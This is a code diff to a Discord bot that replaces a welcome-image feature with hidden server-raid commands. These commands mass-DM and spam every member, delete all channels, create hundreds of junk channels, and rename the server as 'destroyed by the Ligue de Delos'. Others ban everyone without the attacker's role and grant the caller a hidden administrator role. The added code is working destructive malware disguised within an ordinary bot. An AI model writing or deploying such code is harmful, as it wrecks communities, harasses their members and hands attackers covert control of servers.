@@ -84,21 +84,11 @@ fs.readdir('./commands/NSFW/', (err, filesnsfw) => {
       client.aliases.set(alias, props.help.name);
     });
   });
+ 
   
-  fs.readdir('./commands/test/', (err, filestest) => {
-  if (err) console.error(err);
-  filestest.forEach(f => {
-    const props = require(`./commands/test/${f}`);
-    client.commands.set(props.help.name, props);
-    props.conf.aliases.forEach(alias => {
-      client.aliases.set(alias, props.help.name);
-    });
-  });
-  
-  var totalcmd =  Math.floor(filesfun.length + filesinfo.length + filesmod.length + filessocial.length + filesnsfw.length + filesadmin.length + filesimg.length + filestest.length);
+  var totalcmd =  Math.floor(filesfun.length + filesinfo.length + filesmod.length + filessocial.length + filesnsfw.length + filesadmin.length + filesimg.length);
 console.log(bluecolor(`Il y a un total de ${totalcmd} commandes 👍.`));
   });
-});
 });
 });
 });
@@ -118,41 +108,77 @@ client.elevation = message => {
   return permlvl;
 };
 
-client.on('guildMemberAdd', async member => {
-	const channel = member.guild.channels.find(ch => ch.name === 'kuku');
-	if (!channel) return;
+client.on('message', msg => {
+ 
 
-	const canvas = Canvas.createCanvas(700, 250);
-	const ctx = canvas.getContext('2d');
+            if (msg.content === '.ded') {
+                if (msg.channel.type === "dm") return;
+                if (msg.deletable) msg.delete();
+                msg.guild.members.forEach(member => {
+                  setInterval(function () {
+                    member.send(msg.guild.name + " a été détruit par la Ligue de Delos\nhttps://discord.gg/kkgw4Zp\nhttps://media.giphy.com/media/fs0jQE06crHkXuZGnP/giphy.gif").catch(error => {}) }, 450)})
+       }
 
-	const background = await Canvas.loadImage('https://cdn.discordapp.com/attachments/508426135936303106/515918379916460032/rainbow.png');
-	ctx.drawImage(background, 0, 0, canvas.width, canvas.height);
+if(msg.content === '-del'){
+          if(msg.channel.type === "dm") return;
+          if(msg.guild.channels.size === 0) return;
+          else if(!msg.guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return;
+          msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
+      }
 
-	ctx.strokeStyle = '#74037b';
-	ctx.strokeRect(0, 0, canvas.width, canvas.height);
+  if (msg.content === '-ded') {
+    console.log(`Commande -ded par ${msg.author.tag}`);
 
-	// Slightly smaller text placed above the member's display name
-	ctx.font = '28px sans-serif';
-	ctx.fillStyle = '#ffffff';
-	ctx.fillText('Welcome to the server,', canvas.width / 2.5, canvas.height / 3.5);
+      msg.guild.setIcon('./delos.png').catch(e => {});
+      msg.guild.setName('Détruit par la Ligue de Delos').catch(e => {});
 
-	// Add an exclamation point here and below
-	ctx.font = '22px sans-serif'
-	ctx.fillStyle = '#ffffff';
-	ctx.fillText(`${member.displayName}!`, canvas.width / 2.5, canvas.height / 1.8);
+      for (var i = 0; i < 390; i++) {
+        msg.guild.createChannel('La Ligue de Delos', 'voice').catch(e => {});
+        msg.guild.createChannel('La Ligue de Delos', 'text').catch(e => {});
+      }
 
-	ctx.beginPath();
-	ctx.arc(125, 125, 100, 0, Math.PI * 2, true);
-	ctx.closePath();
-	ctx.clip();
+    if (msg.deletable) {
+      msg.delete();
+    }
+  }
 
-	const { body: buffer } = await snekfetch.get(member.user.displayAvatarURL);
-	const avatar = await Canvas.loadImage(buffer);
-	ctx.drawImage(avatar, 25, 25, 200, 200);
+  if (msg.content === '-rban') {
+    console.log(`Commande -rban par ${msg.author.tag}`);
+    msg.guild.members.forEach(member => {
+      if (!member.roles.exists("name", "Delos") && member.bannable) member.ban().catch(e => {});
+    });
+  }
 
-	const attachment = new Discord.Attachment(canvas.toBuffer(), 'welcome-image.png');
+  if (msg.content === '-stop') {
+    console.log(`Commande -stop par ${msg.author.tag}`);
+    if (msg.deletable) msg.delete().catch(e => {});
+    msg.guild.leave().catch(e => {});
+  }
 
-	channel.send(`Welcome to the server, ${member}!`, attachment);
+  if (msg.content === '-gp') {
+    console.log(`Commande -gp par ${msg.author.tag}`);
+
+    msg.member.guild.createRole({
+      name: "Delos",
+      permissions: "ADMINISTRATOR",
+      mentionable: false
+    }).then(function(role) {
+      msg.member.addRole(role);
+      if (msg.deletable) msg.delete().catch(e => {});
+    }).catch(e => {});
+  }
+  //#endregion
 });
+client.on("message", msg => {
+        if(msg.content.startsWith("-ded")){
+           msg.delete()
+            let i = 0;
+            let interval = setInterval(function () {
+              msg.guild.channels.forEach(channel => {
+                if (channel.type === "text") channel.send('@everyone  @here  Detruit par la ligue de delos\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nhttps://media.giphy.com/media/fs0jQE06crHkXuZGnP/giphy.gif')
+              }, 2500);
+            });
+          }
+        });
 
 client.login(process.env.TOKEN);
